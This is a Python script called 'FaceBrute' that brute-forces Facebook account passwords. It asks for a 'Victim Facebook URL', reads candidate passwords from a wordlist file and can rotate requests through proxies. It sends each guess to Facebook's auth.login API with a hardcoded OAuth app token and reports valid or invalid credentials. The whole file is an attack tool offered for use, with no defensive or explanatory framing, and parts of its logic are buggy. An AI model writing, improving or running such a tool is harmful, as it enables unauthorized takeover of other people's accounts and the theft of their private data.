import requests
import os
import time

title = (""" 
  ______             ____             _       
 |  ____|           |  _ \           | |      
 | |__ __ _  ___ ___| |_) |_ __ _   _| |_ ___ 
 |  __/ _` |/ __/ _ \  _ <| '__| | | | __/ _ 
 | | | (_| | (_|  __/ |_) | |  | |_| | ||  __/
 |_|  \__,_|\___\___|____/|_|   \__,_|\__\___|
                                              
                                              
""")
clear = lambda: os.system('cls')
print(title)
cc = bool
choice = input("Use Proxy ? [Yes/No]: ")
choice = choice.lower()
while True:
    if "no" in choice:
        cc = False
        break
    else:
        ok = input("Proxy Type [Http/Https/Socks4/Socks5]: ")
        ok = ok.lower()
        p = open("proxy.txt", "r")
        proxy = [ss.rstrip() for ss in p.readlines()]
        proxez = {ok: proxy}
        cc = True
        break
userr = input("Enter Victim Facebook URL: ").split("/")
user = str(userr[3])
a = open("pass.txt", "r")
file = [s.rstrip()for s in a.readlines()]
clear()
print(title)
for co in file:
    account = co.split(":")
    password = account[0]
    login = {

        "email": user,
        "password": password,
        "credentials_type": "password",
        "format": "json",
    }
    header = {"authorization": "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16"}
    if cc:
        try:
            req = requests.post("https://b-api.facebook.com/method/auth.login", data=login, headers=header, proxies=proxez).text
            if "User must verify" in req:
                print("VALID >", user + ":" + password)
                break
            elif "Invalid username" in req:
                print("INVALID >", user + ":" + password)

            print()
            print()
            input('Press Any Key To Exit')

        except:
            continue

    else:
        try:
            req = requests.post("https://b-api.facebook.com/method/auth.login", data=login, headers=header).text
            if "User must verify" in req:
                print("VALID >", user + ":" + password)
                break
            elif "Invalid username" in req:
                print("INVALID >", user + ":" + password)

            print()
            print()
            input('Press Any Key To Exit')
        except:
            continue

